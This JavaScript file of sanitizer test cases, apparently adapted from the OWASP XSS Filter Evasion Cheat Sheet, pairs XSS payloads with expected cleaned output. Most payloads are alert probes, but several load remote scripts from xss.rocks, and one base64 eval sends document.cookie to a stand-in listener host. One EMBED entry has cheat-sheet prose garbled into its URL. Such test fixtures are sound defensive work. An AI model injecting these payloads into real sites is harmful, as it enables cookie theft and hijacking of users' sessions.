/*!
 | XSS Filter Evasion Examples
 |
 | Using examples from the XSS Filter Evasion Cheat Sheet (https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
 | by Robert "RSnake" Hansen
 | Last revision (mm/dd/yy): 7/4/2018
 | License: Attribution-ShareAlike 4.0 International (CC BY-SA 4.0) (https://creativecommons.org/licenses/by-sa/4.0/)
*/
/*--------------------------------------------------------------------------------------------------------------------*/
export var testCases = [{
        'label': 'XSS Locator',
        'example': '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";' +
            'alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'>' +
            '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
        'cleanedHtml': '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"' +
            ';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//' +
            '--&gt;&lt;/SCRIPT&gt;"&gt;\'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;',
        'cleanedNoHtml': '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"' +
            ';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--&gt;"&gt;\'&gt;'
    }, {
        'label': 'XSS Locator (short)',
        'example': '\'\';!--"<XSS>=&()}',
        'cleanedHtml': '\'\';!--"&lt;XSS&gt;=&()}',
        'cleanedNoHtml': '\'\';!--"=&amp;()}'
    }, {
        'label': 'XSS Locator (polygot)',
        'example': 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        'cleanedHtml': 'javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script' +
            '&gt;&lt;/xmp&gt;&lt;svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'&gt;',
        'cleanedNoHtml': 'javascript:/*--&gt;'
    }, {
        'label': 'Plaintext',
        'example': '<PLAINTEXT>',
        'cleanedHtml': '&lt;PLAINTEXT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'No Filter Evasion',
        'example': '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Filter bypass based polyglot',
        'example': '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\>' +
            '<plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:' +
            'alert(/XSS/) type=submit>\'-->"></script><script>alert(document.cookie)</script>"><img/id=' +
            '"confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'"><img src=' +
            '"http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">',
        'cleanedHtml': '\'"&gt;&gt;&lt;marquee&gt;<img src>&lt;/marquee&gt;"&gt;&lt;/plaintext&gt;&lt;/|' +
            '&gt;&lt;plaintext/onmouseover=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com' +
            '&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;\'--&gt;"&gt;&lt;/script' +
            '&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt;&lt;img/id="confirm&lpar;1)"' +
            '/alt="/"src="/"onerror=eval(id)&gt;\'"&gt;' +
            '<img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">',
        'cleanedNoHtml': '\'"&gt;&gt;"&gt;&lt;/|&gt;@gmail.com\'--&gt;"&gt;"&gt;\'"&gt;'
    }, {
        'label': 'Image XSS using the JavaScript directive',
        'example': '<IMG SRC="javascript:alert(\'XSS\');">',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'No quotes and no semicolon',
        'example': '<IMG SRC=javascript:alert(\'XSS\')>',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Case insensitive XSS attack vector',
        'example': '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'HTML entities',
        'example': '<IMG SRC=javascript:alert(&quot;XSS&quot;)>',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Grave accent obfuscation',
        'example': '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Malformed A tags 1',
        'example': '<a onmouseover="alert(document.cookie)">xxs link</a>',
        'cleanedHtml': '<a>xxs link</a>',
        'cleanedNoHtml': 'xxs link'
    }, {
        'label': 'Malformed A tags 2',
        'example': '<a onmouseover=alert(document.cookie)>xxs link</a>',
        'cleanedHtml': '<a>xxs link</a>',
        'cleanedNoHtml': 'xxs link'
    }, {
        'label': 'Malformed IMG tags',
        'example': '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
        'cleanedHtml': '<img>&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;"&gt;',
        'cleanedNoHtml': '"&gt;'
    }, {
        'label': 'fromCharCode',
        'example': '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Default SRC tag to get past filters that check SRC domain',
        'example': '<IMG SRC=# onmouseover="alert(\'xxs\')">',
        'cleanedHtml': '<img src="#">',
        'cleanedNoHtml': ''
    }, {
        'label': 'Default SRC tag by leaving it empty',
        'example': '<IMG SRC= onmouseover="alert(\'xxs\')">',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Default SRC tag by leaving it out entirely',
        'example': '<IMG onmouseover="alert(\'xxs\')">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'On error alert',
        'example': '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
        'cleanedHtml': '<img src="/"></img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'IMG onerror and javascript alert encode',
        'example': '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#000010' +
            '5&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088' +
            '&#0000083&#0000083&#0000039&#0000041">',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Decimal HTML character references',
        'example': '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;' +
            '&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Decimal HTML character references without trailing semicolons',
        'example': '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&' +
            '#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&' +
            '#0000083&#0000039&#0000041>',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Hexadecimal HTML character references without trailing semicolons',
        'example': '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&' +
            '#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Embedded tab',
        'example': '<IMG SRC="jav\tascript:alert(\'XSS\');">',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Embedded Encoded tab',
        'example': '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Embedded newline to break up XSS',
        'example': '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Embedded carriage return to break up XSS',
        'example': '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Null breaks up JavaScript directive',
        'example': '<IMG SRC=java\0script:alert(\"XSS\")>',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Spaces and meta chars before the JavaScript in images for XSS',
        'example': '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Non-alpha-non-digit XSS 1',
        'example': '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT/XSS SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Non-alpha-non-digit XSS 2',
        'example': '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
        'cleanedHtml': '&lt;BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Non-alpha-non-digit XSS 3',
        'example': '<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT/SRC="http://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Extraneous open brackets',
        'example': '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        'cleanedHtml': '&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': '&lt;'
    }, {
        'label': 'No closing script tags',
        'example': '<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
        'cleanedHtml': '&lt;SCRIPT SRC=http://xss.rocks/xss.js?&lt; B &gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Protocol resolution in script tags',
        'example': '<SCRIPT SRC=//xss.rocks/.j>',
        'cleanedHtml': '&lt;SCRIPT SRC=//xss.rocks/.j&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Half open HTML/JavaScript XSS vector',
        'example': '<IMG SRC="javascript:alert(\'XSS\')"',
        'cleanedHtml': '&lt;IMG SRC="javascript:alert(\'XSS\')"',
        'cleanedNoHtml': ''
    }, {
        'label': 'Double open angle brackets',
        'example': '<iframe src=http://xss.rocks/scriptlet.html <',
        'cleanedHtml': '&lt;iframe src=http://xss.rocks/scriptlet.html &lt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Escaping JavaScript escapes',
        'example': '</script><script>alert(\'XSS\');</script>',
        'cleanedHtml': '&lt;/script&gt;&lt;script&gt;alert(\'XSS\');&lt;/script&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'End title tag',
        'example': '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
        'cleanedHtml': '&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'INPUT image',
        'example': '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
        'cleanedHtml': '&lt;INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'BODY image',
        'example': '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
        'cleanedHtml': '&lt;BODY BACKGROUND="javascript:alert(\'XSS\')"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'IMG Dynsrc',
        'example': '<IMG DYNSRC="javascript:alert(\'XSS\')">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'IMG lowsrc',
        'example': '<IMG LOWSRC="javascript:alert(\'XSS\')">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'List-style-image',
        'example': '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
        'cleanedHtml': '&lt;STYLE&gt;li {list-style-image: url("javascript:alert(\'XSS\')");}&lt;/STYLE&gt;<ul><li>XSS</br>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'VBscript in an image',
        'example': '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
        'cleanedHtml': '<img src>',
        'cleanedNoHtml': ''
    }, {
        'label': 'SVG object tag',
        'example': '<svg/onload=alert(\'XSS\')>',
        'cleanedHtml': '&lt;svg/onload=alert(\'XSS\')&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'BODY tag 1',
        'example': '<BODY ONLOAD=alert(\'XSS\')>',
        'cleanedHtml': '&lt;BODY ONLOAD=alert(\'XSS\')&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'BODY tag 2',
        'example': '<BODY ONLOAD =alert(\'XSS\')>',
        'cleanedHtml': '&lt;BODY ONLOAD =alert(\'XSS\')&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'BGSOUND',
        'example': '<BGSOUND SRC="javascript:alert(\'XSS\');">',
        'cleanedHtml': '&lt;BGSOUND SRC="javascript:alert(\'XSS\');"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': '& JavaScript includes',
        'example': '<BR SIZE="&{alert(\'XSS\')}">',
        'cleanedHtml': '<br>',
        'cleanedNoHtml': ''
    }, {
        'label': 'STYLE sheet',
        'example': '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
        'cleanedHtml': '&lt;LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Remote style sheet 1',
        'example': '<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">',
        'cleanedHtml': '&lt;LINK REL="stylesheet" HREF="http://xss.rocks/xss.css"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Remote style sheet 2',
        'example': '<STYLE>@import\'http://xss.rocks/xss.css\';</STYLE>',
        'cleanedHtml': '&lt;STYLE&gt;@import\'http://xss.rocks/xss.css\';&lt;/STYLE&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Remote style sheet 3',
        'example': '<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">',
        'cleanedHtml': '&lt;META HTTP-EQUIV="Link" Content="&lt;http://xss.rocks/xss.css&gt;; REL=stylesheet"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Remote style sheet 4',
        'example': '<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>',
        'cleanedHtml': '&lt;STYLE&gt;BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}&lt;/STYLE&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'STYLE tags with broken up JavaScript for XSS',
        'example': '<STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>',
        'cleanedHtml': '&lt;STYLE&gt;@import\'ja\u000basc\ript:alert(\"XSS\")\';&lt;/STYLE&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'STYLE attribute using a comment to break up expression',
        'example': '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',
        'cleanedHtml': '<img style>',
        'cleanedNoHtml': ''
    }, {
        'label': 'STYLE tag using background-image',
        'example': '<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')");}</STYLE><A CLASS=XSS></A>',
        'cleanedHtml': '&lt;STYLE&gt;.XSS{background-image:url("javascript:alert(\'XSS\')");}&lt;/STYLE&gt;<a></a>',
        'cleanedNoHtml': ''
    }, {
        'label': 'STYLE tag using background',
        'example': '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>',
        'cleanedHtml': '&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert(\'XSS\')")}&lt;/STYLE&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Anonymous HTML with STYLE attribute',
        'example': '<XSS STYLE="xss:expression(alert(\'XSS\'))">',
        'cleanedHtml': '&lt;XSS STYLE="xss:expression(alert(\'XSS\'))"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Local htc file',
        'example': '<XSS STYLE="behavior: url(xss.htc);">',
        'cleanedHtml': '&lt;XSS STYLE="behavior: url(xss.htc);"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'META',
        'example': '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
        'cleanedHtml': '&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'META using data',
        'example': '<META HTTP-EQUIV="refresh" CONTENT="0;' +
            'url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
        'cleanedHtml': '&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,' +
            'PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'META with additional URL parameter',
        'example': '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
        'cleanedHtml': '&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'IFRAME',
        'example': '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
        'cleanedHtml': '&lt;IFRAME SRC="javascript:alert(\'XSS\');"&gt;&lt;/IFRAME&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'IFRAME Event based',
        'example': '<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>',
        'cleanedHtml': '&lt;IFRAME SRC=# onmouseover="alert(document.cookie)"&gt;&lt;/IFRAME&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'FRAME',
        'example': '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
        'cleanedHtml': '&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert(\'XSS\');"&gt;&lt;/FRAMESET&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'TABLE',
        'example': '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
        'cleanedHtml': '<table>',
        'cleanedNoHtml': ''
    }, {
        'label': 'TD',
        'example': '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        'cleanedHtml': '<table><td>',
        'cleanedNoHtml': ''
    }, {
        'label': 'DIV: DIV background-image',
        'example': '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
        'cleanedHtml': '<div style>',
        'cleanedNoHtml': ''
    }, {
        'label': 'DIV: DIV background-image plus extra characters',
        'example': '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">',
        'cleanedHtml': '<div style>',
        'cleanedNoHtml': ''
    }, {
        'label': 'DIV: DIV expression',
        'example': '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        'cleanedHtml': '<div style>',
        'cleanedNoHtml': ''
    }, {
        'label': 'BASE tag',
        'example': '<BASE HREF="javascript:alert(\'XSS\');//">',
        'cleanedHtml': '&lt;BASE HREF="javascript:alert(\'XSS\');//"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'OBJECT tag',
        'example': '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>',
        'cleanedHtml': '&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"&gt;&lt;/OBJECT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'APPLET tag',
        'example': '<APPLET TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></APPLET>',
        'cleanedHtml': '&lt;APPLET TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"&gt;&lt;/APPLET&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'Using an EMBED tag you can embed a Flash movie that contains XSS',
        'example': '<EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains ' +
            'XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking=' +
            '"internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" ' +
            'AllowScriptAccess="always"></EMBED>',
        'cleanedHtml': '&lt;EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that ' +
            'contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and ' +
            'allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info)' +
            '.:org/xss.swf" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'You can EMBED SVG which can contain your XSS vector',
        'example': '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDA' +
            'vc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xO' +
            'Tk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2' +
            'NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" ' +
            'AllowScriptAccess="always"></EMBED>',
        'cleanedHtml': '&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub' +
            '3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3' +
            'LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw Ii' +
            'BpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="' +
            ' type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'XML data island with CDATA obfuscation',
        'example': '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(\'XSS\')"></B></I></XML>' +
            '<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>',
        'cleanedHtml': '&lt;XML ID="xss"&gt;<i><b><img src></b></i>&lt;/XML&gt;<span></span>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Locally hosted XML with embedded JavaScript that is generated using an XML data island',
        'example': '<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>',
        'cleanedHtml': '&lt;XML SRC="xsstest.xml" ID=I&gt;&lt;/XML&gt;<span></span>',
        'cleanedNoHtml': ''
    }, {
        'label': 'Assuming you can only fit in a few characters and it filters against ".js"',
        'example': '<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT SRC="http://xss.rocks/xss.jpg"&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'SSI (Server Side Includes)',
        'example': '<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=' +
            'http://xss.rocks/xss.js></SCRIPT>\'"-->',
        'cleanedHtml': '&lt;!--#exec cmd="/bin/echo \'&lt;SCR\'"--&gt;&lt;!--#exec cmd="/bin/echo \'IPT ' +
            'SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;\'"--&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'IMG Embedded commands',
        'example': '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
        'cleanedHtml': '<img src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
        'cleanedNoHtml': ''
    }, {
        'label': 'Cookie manipulation',
        'example': '<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">',
        'cleanedHtml': '&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert(\'XSS\')&lt;/SCRIPT&gt;"&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'XSS using HTML quote encapsulation 1',
        'example': '<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT a="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'XSS using HTML quote encapsulation 2',
        'example': '<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT ="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'XSS using HTML quote encapsulation 3',
        'example': '<SCRIPT a=">" \'\' SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT a="&gt;" \'\' SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'XSS using HTML quote encapsulation 4',
        'example': '<SCRIPT "a=\'>\'" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT "a=\'&gt;\'" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'XSS using HTML quote encapsulation 5',
        'example': '<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT a=`&gt;` SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'XSS using HTML quote encapsulation 6',
        'example': '<SCRIPT a=">\'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT a="&gt;\'&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': ''
    }, {
        'label': 'XSS using HTML quote encapsulation 7',
        'example': '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>',
        'cleanedHtml': '&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="httx://xss.rocks/xss.js' +
            '"&gt;&lt;/SCRIPT&gt;',
        'cleanedNoHtml': 'PT SRC="httx://xss.rocks/xss.js"&gt;'
    }, {
        'label': 'URL string evasion: IP versus hostname',
        'example': '<A HREF="http://66.102.7.147/">XSS</A>',
        'cleanedHtml': '<a href="http://66.102.7.147/">XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: URL encoding',
        'example': '<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>',
        'cleanedHtml': '<a href="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Dword encoding',
        'example': '<A HREF="http://1113982867/">XSS</A>',
        'cleanedHtml': '<a href="http://1113982867/">XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Hex encoding',
        'example': '<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>',
        'cleanedHtml': '<a href="http://0x42.0x0000066.0x7.0x93/">XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Octal encoding',
        'example': '<A HREF="http://0102.0146.0007.00000223/">XSS</A>',
        'cleanedHtml': '<a href="http://0102.0146.0007.00000223/">XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Base64 encoding',
        'example': '<img onload="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=\'))">',
        'cleanedHtml': '<img>',
        'cleanedNoHtml': ''
    }, {
        'label': 'URL string evasion: Mixed encoding',
        'example': '<A HREF="h\ntt\tp://6\t6.000146.0x7.147/">XSS</A>',
        'cleanedHtml': '<a href>XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Protocol resolution bypass 1',
        'example': '<A HREF="//www.google.com/">XSS</A>',
        'cleanedHtml': '<a href>XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Protocol resolution bypass 2',
        'example': '<A HREF="\\\\www.google.com\\">XSS</A>',
        'cleanedHtml': '<a href>XSS</a>',
        'cleanedNoHtml': 'XSS'
    }, {
        'label': 'URL string evasion: Google "feeling lucky" part 1',
        'example': '<A HREF="//google">XSS</A>',
        'cleanedHtml': '<a href>XSS</a>',
